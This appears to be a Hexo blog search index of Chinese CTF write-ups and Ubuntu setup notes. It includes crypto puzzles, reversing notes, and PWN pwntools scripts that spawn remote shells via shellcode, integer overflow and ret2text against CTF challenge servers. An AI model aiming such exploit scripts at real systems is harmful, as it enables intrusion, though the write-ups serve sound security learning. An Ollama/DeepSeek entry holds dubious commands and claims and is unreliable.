<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>r1_8b</title>
      <link href="/2025/06/38d795f72413.html"/>
      <url>/2025/06/38d795f72413.html</url>
      
        <content type="html"><![CDATA[<p>系统变量，对系统的所有账户生效，您可以根据情况自己选。点击添加添加，输入变量名OLLAMA_MODELS，变量值输入您放置ollama模型的新地址，我这里放在了E:\ollama\models</p><p><img src="/images/254E7FA0-46F1-4144-B913-C7C3E82AFEBA.png"></p><p><img src="/images/%7BE5D4D6BF-5C2F-450B-BF73-B2076752FB89%7D.png"></p><ol><li>拉取模型</li></ol><blockquote><p>ollama pull deepseek-r1:8b</p></blockquote><ol start="2"><li>运行模型</li></ol><blockquote><p>ollama run deepseek-r1:8b</p></blockquote><h3 id="🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama"><a href="#🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama" class="headerlink" title="🔍 Can I run DeepSeek-R1:8B via Ollama?"></a>🔍 Can I run DeepSeek-R1:8B via Ollama?</h3><p>Currently, <strong>Ollama does not officially support the DeepSeek-R1 8B model</strong> unless it has been added to their<br>repository or community-supported list. You should check:</p><ul><li>The <a href="https://ollama.com/models">Ollama models page</a> for updates.</li><li>Community forums (e.g., GitHub issues) if users have shared custom Docker images&#x2F;definitions.</li></ul><hr><h3 id="🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama"><a href="#🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama" class="headerlink" title="🧪 How to run transformer models like DeepSeek-R1 via Ollama"></a>🧪 How to run transformer models like DeepSeek-R1 via Ollama</h3><p>If the model is supported, you can use this command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:8b</span><br></pre></td></tr></table></figure><p>This will:</p><ul><li>Download (if not installed) and load the 8B parameter version of DeepSeek-R1.</li><li>Start a local instance for interactive chat or API access.</li></ul><hr><h3 id="🤔-What-is-DeepSeek-R1-8B"><a href="#🤔-What-is-DeepSeek-R1-8B" class="headerlink" title="🤔 What is DeepSeek-R1:8B?"></a>🤔 What is DeepSeek-R1:8B?</h3><p>DeepSeek-R1 is an advanced transformer language model developed by <a href="https://www.deepseek.com/">深度求索（DeepSeek）</a>. The “8B” refers to <strong>8 billion parameters</strong> in the model. It’s designed for:</p><ul><li>Natural language understanding and generation.</li><li>Code-related tasks (syntax, debugging).</li><li>Knowledge answering.</li><li>Creative writing.</li></ul><hr><h3 id="📄-Example-usage-with-Ollama-CLI"><a href="#📄-Example-usage-with-Ollama-CLI" class="headerlink" title="📄 Example usage with Ollama CLI"></a>📄 Example usage with Ollama CLI</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start interactive chat (if supported)</span></span><br><span class="line">ollama chat deepseek-r1:8b</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or generate text via API/command line:</span></span><br><span class="line">curl http://localhost:11434/api/generate \</span><br><span class="line">  -X POST \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;model&quot;: &quot;deepseek-r1:8b&quot;,</span></span><br><span class="line"><span class="string">    &quot;prompt&quot;: &quot;Explain quantum computing in simple terms.&quot;,</span></span><br><span class="line"><span class="string">    &quot;stream&quot;: false</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="⚠️-If-the-model-isn’t-supported-yet"><a href="#⚠️-If-the-model-isn’t-supported-yet" class="headerlink" title="⚠️ If the model isn’t supported yet:"></a>⚠️ If the model isn’t supported yet:</h3><p>You can try running it via Docker (if you have technical access):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name deepseek-r1 \</span><br><span class="line">  -p 11434:11434 \</span><br><span class="line">  --<span class="built_in">rm</span> \</span><br><span class="line">  -v ollama_models:/models \</span><br><span class="line">  llamafile/docker-ollama \</span><br><span class="line">  predict DeepSeek-R1 /models/deepseek-r1.tar</span><br></pre></td></tr></table></figure><p>But note: This may not be officially maintained.</p><hr><h3 id="🌟-What-else-can-Ollama-run"><a href="#🌟-What-else-can-Ollama-run" class="headerlink" title="🌟 What else can Ollama run?"></a>🌟 What else can Ollama run?</h3><p>Oll (a) supports models like:</p><ul><li>Llama, Mistral, Mixtral</li><li>GPT models (via LMSYS)</li><li>Gemma, Phi, CodeLlama</li><li>And many others!</li></ul><p>Check the <a href="https://ollama.com/models">current list on their website</a>.</p><hr><p>Let me know if you’d like help with a specific task using DeepSeek-R1 or another model! 😊</p>]]></content>
      
      
      <categories>
          
          <category> Deepseek </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>摩斯电码</title>
      <link href="/2025/06/828dca5ddec2.html"/>
      <url>/2025/06/828dca5ddec2.html</url>
      
        <content type="html"><![CDATA[<p>…. . .-.. .-.. — ..–.- -.-. .-. -.– .–. - —<br>hello_crypto<br>TZCFlag{HELLO_CRYPTO}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 莫尔斯电码(Morse Code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>摩丝</title>
      <link href="/2025/06/21db97fd724d.html"/>
      <url>/2025/06/21db97fd724d.html</url>
      
        <content type="html"><![CDATA[<p>.. .-.. — …- . -.– — ..-<br>iloveyou</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
          <category> 莫尔斯电码(Morse Code) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/358bdb20a0d3.html"/>
      <url>/2025/06/358bdb20a0d3.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>password</title>
      <link href="/2025/06/fbf475443deb.html"/>
      <url>/2025/06/fbf475443deb.html</url>
      
        <content type="html"><![CDATA[<p>姓名：张三<br>生日：19900315<br>key格式为key{xxxxxxxxxx}</p><p>发现如果将张三变为 zs加上它的日期长度刚好符合题目的xx长度，那我们不妨试下：<br>flag{zs19900315}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dancemen</title>
      <link href="/2025/06/cbb71a3305da.html"/>
      <url>/2025/06/cbb71a3305da.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/dancemen.jpg"><br><img src="/images/Pastedimage20250603124314.png"><br>TZCFlag{dancemenareinteresting}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 不知道分哪类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rabbit 1</title>
      <link href="/2025/06/bf8f92268b07.html"/>
      <url>/2025/06/bf8f92268b07.html</url>
      
        <content type="html"><![CDATA[<p>U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI<br><img src="/images/8C5ED5D3-48AE-4A5B-94BF-527E062586AC.png"><br><a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> Rabbit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shellcode</title>
      <link href="/2025/06/63e0052f564e.html"/>
      <url>/2025/06/63e0052f564e.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7BD963E729-82E8-4920-BCC6-3E43CDB31255%7D1.png"><br>检查安全机制发现 <strong>NX (No-Execute) 已启用</strong>，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 <strong>后门函数</strong>，这应该才是解题的关键。<br><img src="/images/Pastedimage20250605220423.png"><br><img src="/images/Pastedimage20250605220507.png"><br>也没有开啥保护。<br>logo明显提示用shellcode,所以我们需要发送sellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;10.190.131.17&quot;</span>,<span class="number">62534</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/%7B17DD8EEB-247B-4BB2-8BA3-995677E38184%7D1.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整数溢出</title>
      <link href="/2025/06/1f04604b780a.html"/>
      <url>/2025/06/1f04604b780a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7B82DBD94C-4B71-4F33-8BD4-3EECD2675F78%7D.png"><br><img src="/images/Pastedimage20250605212046.png"><br><img src="/images/Pastedimage20250605212223.png"><br>这里的<strong>0 ~ 0x7fffffff</strong>就是 <strong>0~2147483647</strong> ，<br><strong>0x80000000 ~ 0xffffffff</strong>就是 <strong>-2147483648 ~ -1</strong><br><img src="/images/Pastedimage20250605212238.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务器（根据题目提示修改端口）</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">61862</span>)  <span class="comment"># 示例端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待提示</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter an unsigned integer: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送目标数字</span></span><br><span class="line">p.sendline(<span class="string">b&quot;4294967295&quot;</span>)  <span class="comment"># 或 b&quot;-1&quot; 在某些环境下也可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收flag</span></span><br><span class="line"><span class="built_in">print</span>(p.recvall().decode())</span><br></pre></td></tr></table></figure><p>这道题涉及整数溢出漏洞利用，目标是通过输入特定数字触发<code>gift()</code>函数获取flag。以下是完整的解题步骤：</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li><strong>关键代码</strong>：<br> printf(“Enter an unsigned integer: “);<br> _isoc99_scanf(“%u”, &amp;v4);  &#x2F;&#x2F; 读取无符号整数<br> if (v4 &#x3D;&#x3D; -1)  &#x2F;&#x2F; -1在无符号中等于4294967295<br> gift();    &#x2F;&#x2F; 触发flag输出</li><li><strong>整数溢出原理</strong>：<ul><li><code>v4</code>是<code>unsigned int</code>类型（4字节）</li><li><code>-1</code>在内存中被解释为无符号整数的最大值：<code>0xFFFFFFFF</code>（4294967295）    </li><li>输入<code>4294967295</code>可使条件<code>v4 == -1</code>成立</li></ul></li><li><strong>防护机制</strong>：<br> Full RELRO | Canary | NX | PIE<br> 虽然防护较强，但无需绕过这些保护，因为利用不涉及栈溢出</li></ol><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol><li><strong>计算目标值</strong>：<br> 4294967295 &#x3D; 2³² - 1 &#x3D; 0xFFFFFFFF</li><li><strong>触发gift函数</strong>：<ul><li>当输入<code>4294967295</code>时：<br>  v4 &#x3D; 4294967295 &#x3D; 0xFFFFFFFF<br>  v4 &#x3D;&#x3D; -1 → True  &#x2F;&#x2F; 因为-1在无符号中就是0xFFFFFFFF</li><li>执行<code>system(&quot;cat /ctfshow_flag&quot;)</code><br><img src="/images/%7B91C4D1E4-DA5C-45B1-A1AE-72BD35872AC2%7D.png"></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2025/06/6eb5ab8aa336.html"/>
      <url>/2025/06/6eb5ab8aa336.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%7B53C70E9A-8E89-4C8B-95E3-7078BD55343B%7D1.png"><br>32位<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605135457.png)<br>Tab键<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605135812.png)<br>nc一下<br><img src="/images/%7BEAFBEA4F-0F51-421C-AD17-A89910A6224D%7D.png"><br>看pwnme函数<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605140015.png)<br>这里有个fgets函数<br>Tab键<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605140201.png)<br><strong>&#x3D;&#x3D;可以看到第一行s这个变量是在距离栈底ebp9个字节的地方&#x3D;&#x3D;</strong><br><img src="/images/%7B463C8EE2-1263-43AF-B876-7B0C4F4B928F%7D.png"><br>题目叫stack，所以看了一下stack函数<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605140449.png)<br>妥妥的getshell函数<br>这段代码 system(“&#x2F;bin&#x2F;sh”) 的作用是在 Linux 系统中执行 &#x2F;bin&#x2F;sh 命令，它会打开一个新的 shell 进程。<br>具体来说，&#x2F;bin&#x2F;sh 是指向系统中的默认 shell 解释器的路径。通过执行该命令，你将进入一个新的交互式 shell 环境，可以在其中执行各种命令和操作。这对于开发者或者在某些情况下需要与系统进行交互的用户来说非常有用。</p><p>main点一下绿色<br><img src="/images/Pastedimage20250605141027.png"><br>可以看到该函数地址为0x0804850F<br><img src="/images/%7B3BBE1FF3-C061-4222-B03E-C2B1AB35901F%7D.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28308</span>)    <span class="comment">#远程连接</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)   <span class="comment">#用a字符填满前面9个字节的空白，然后再用4字节填满原来的ebp(这里为汇编基础，因为程序位32位程序）</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)                    <span class="comment">#然后p32将stack函数写入地址的四个字节</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/%7B3D19A85A-20C8-444E-A235-C906BCB99447%7D.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =remote(<span class="string">&quot;pwn.chall.ctf.show&quot;</span>,<span class="number">28006</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x9</span>+<span class="number">4</span>) + p32(<span class="number">0x0804850F</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF</title>
      <link href="/2025/06/232c7fc0fbd9.html"/>
      <url>/2025/06/232c7fc0fbd9.html</url>
      
        <content type="html"><![CDATA[<p>linux也能逆？</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tea</title>
      <link href="/2025/06/e1972a9f50a5.html"/>
      <url>/2025/06/e1972a9f50a5.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250606185429.png"><br><img src="/images/Pastedimage20250606185436.png"><br><img src="/images/Pastedimage20250606185452.png"></p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单的加密</title>
      <link href="/2025/06/596e40547bb0.html"/>
      <url>/2025/06/596e40547bb0.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604161939.png"><br>shift+F12+Fn<br><img src="/images/Pastedimage20250604162108.png"><br>点击<br><img src="/images/Pastedimage20250604162142.png"><br>点击紫色的<br><img src="/images/Pastedimage20250604162209.png"><br>Tab键<br><img src="/images/%7B25FB6DF9-3CCD-4E0E-8CCD-6A7C5D792114%7D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-114h]  </span><br><span class="line">  char Str1[260]; // [esp+DCh] [ebp-108h] BYREF</span><br><span class="line">  </span><br><span class="line">  #提示用户输入 flag</span><br><span class="line">  sub_456502(&quot;Hi CTFer,Input your flag:&quot;);</span><br><span class="line">  sub_4554EF(&quot;%s&quot;, Str1);</span><br><span class="line">  </span><br><span class="line">  for ( i = 0; i &lt; j__strlen(Str1); ++i )</span><br><span class="line">    ++Str1[i]; #将每个字符的 ASCII 值加 1</span><br><span class="line">  if ( !j__strcmp(Str1, &quot;gmbh|ZPV`GJOE`JU`IBIB~&quot;) )</span><br><span class="line">    sub_456502(&quot;you are right!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_456502(&quot;you are wrong!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对目标字符串 gmbh{ZPV<code>GJOE</code>JU<code>IBIB~&#125; 进行反向操作（每个字符减 1），得到原始输入的 flag：  每个字符减 1 后：</code>flag{YOU_FIND_IT_HAHA}&#96;</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>apt源</title>
      <link href="/2025/06/53e892fa4bab.html"/>
      <url>/2025/06/53e892fa4bab.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Types: deb</span><br><span class="line">URIs: http://mirrors.ustc.edu.cn/ubuntu/</span><br><span class="line">Suites: noble noble-updates noble-security</span><br><span class="line">Components: main restricted universe multiverse</span><br><span class="line">Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>配置静态ip</title>
      <link href="/2025/06/2ac849227b33.html"/>
      <url>/2025/06/2ac849227b33.html</url>
      
        <content type="html"><![CDATA[<p>sudo -i #root用户<br> ls -l &#x2F;etc&#x2F;netplan<br><img src="/images/Pastedimage20250601205045.png"><br>sudo chmod 600 &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #修改文件权限<br>sudo nano &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #更新配置文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      addresses: [192.168.142.132/24]         # 设置静态IP地址和掩码</span><br><span class="line">      routes:</span><br><span class="line">        - to: default</span><br><span class="line">          via: 192.168.142.2</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: [114.114.114.114,8.8.8.8]  # 设置主、备DNS</span><br><span class="line">      dhcp4: false                            # 禁用dhcp</span><br></pre></td></tr></table></figure><p>sudo netplan apply  #应用更改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#验证配置</span><br><span class="line">ip a show ens33</span><br><span class="line">ping -c 4 8.8.8.8   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#确保SSH服务正常运行</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">sudo systemctl enable ssh</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250601213334.png"></p><h4 id="使用-SSH-密钥登录（最安全）"><a href="#使用-SSH-密钥登录（最安全）" class="headerlink" title="使用 SSH 密钥登录（最安全）"></a><strong>使用 SSH 密钥登录（最安全）</strong></h4><ol><li>在物理机生成密钥对：<br> ssh-keygen  # 默认保存到 ~&#x2F;.ssh&#x2F;id_rsa&#x3D;&#x3D;(空密码)&#x3D;&#x3D;<br><img src="/images/Pastedimage20250601214315.png">）</li><li>将公钥复制到虚拟机：<br> scp C:\Users\Rhea.ssh\id_rsa.pub <a href="mailto:&#x72;&#104;&#x65;&#97;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#x31;&#52;&#50;&#46;&#49;&#51;&#50;">rhea@192.168.142.132</a>:~&#x2F;<br><img src="/images/Pastedimage20250601214846.png">）</li><li>直接免密登录：<br><img src="/images/Pastedimage20250601221831.png">）</li></ol>]]></content>
      
      
      <categories>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关闭自动更新</title>
      <link href="/2025/06/7f46169c13bc.html"/>
      <url>/2025/06/7f46169c13bc.html</url>
      
        <content type="html"><![CDATA[<p><code>sudo nano /etc/apt/apt.conf.d/20auto-upgrades</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">APT::Periodic::Update-Package-Lists &quot;0&quot;;</span><br><span class="line">APT::Periodic::Download-Upgradeable-Packages &quot;0&quot;;</span><br><span class="line">APT::Periodic::AutocleanInterval &quot;0&quot;;</span><br><span class="line">APT::Periodic::Unattended-Upgrade &quot;0&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ez_http</title>
      <link href="/2025/06/5a69eaa25605.html"/>
      <url>/2025/06/5a69eaa25605.html</url>
      
        <content type="html"><![CDATA[<p>bp抓包<br><img src="/images/%7B3AD6ED26-D5D6-4348-AF13-B5279A3A9036%7D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET：?FantasyLand=0xLE4KCODE</span><br><span class="line">POST：lyc0ris=goat</span><br><span class="line"></span><br><span class="line">请求头：</span><br><span class="line">Referer: https://www.tzc.edu.cn/</span><br><span class="line">User-Agent: SansBrowser</span><br><span class="line">Cookie: user=admin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>用hackbar也行</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码演示</title>
      <link href="/2025/06/5c75ebd024e9.html"/>
      <url>/2025/06/5c75ebd024e9.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> code </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>大杂烩</title>
      <link href="/2025/06/228350e34cac.html"/>
      <url>/2025/06/228350e34cac.html</url>
      
        <content type="html"><![CDATA[<p>SkpERzY0Q0ZKRlpGVTJLU0dWVUVLVFNMT1JVRkFNM1lJVkhFVzNDWUpaWVRPNkE9</p><p>base64<br>JJDG64CFJFZFU2KSGVUEKTSLORUFAM3YIVHEW3CYJZYTO6A&#x3D;<br>base32<br>JFopEIrZiR5hENKthP3xENKlXNq7x<br>xxencode<br>GMPSynt{Penml_Pelcgb}<br>Rot13<br><img src="/images/%7BECF67C34-79AB-4AA8-A6AF-D1D146E8F829%7D.png"><br>TZCFlag{Crazy_Crypto}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA1</title>
      <link href="/2025/06/0208f5194904.html"/>
      <url>/2025/06/0208f5194904.html</url>
      
        <content type="html"><![CDATA[<p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p><p>&#x3D;&#x3D;dp,dq  是<code>d</code>模<code>p-1</code>和<code>q-1</code>的模逆元（在RSA中，它们通常用于快速解密，因为使用它们可以避免计算<code>d</code>，这是一个大数。&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes   #将长整数转化为字节字符串</span><br><span class="line"> </span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span><br><span class="line">dp = 